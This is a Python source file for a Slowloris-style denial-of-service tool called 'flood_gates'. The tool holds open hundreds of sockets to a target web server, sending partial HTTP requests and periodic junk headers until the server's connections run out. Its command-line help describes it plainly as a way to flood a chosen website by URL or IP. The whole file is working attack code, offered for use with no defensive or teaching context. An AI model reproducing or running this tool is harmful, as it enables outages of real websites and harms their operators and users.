import socket, random, time, sys, argparse
from tqdm import tqdm

class flood_gates():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]


    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        print('Opening Flood Gates...\n')
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in tqdm(self._sockets):
                try:
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Basically opens the flood gates on a website')
    parser.add_argument('--url', type=str, help='website you want to flood')
    parser.add_argument('--ip', type=str, help='ip address you want to flood')
    parser.add_argument('-p', '--port', type=int, default=80, help='specific poort where traffic will be sent')
    parser.add_argument('-s', '--sockets', type=int, default=200, help='amount of sockets you want to use')
    parser.add_argument('-t', '--timeout', type=int, default=600, help='delay between calls')

    args = parser.parse_args()
    if args.url is not None:
        ip = socket.gethostbyname(args.url)
        print('{} => {}'.format(args.url, ip))
        flood_gates(ip, args.port, socketsCount=args.sockets).attack(timeout=args.timeout)
    else:
        flood_gates(args.ip, args.port, socketsCount=args.sockets).attack(timeout=args.timeout)

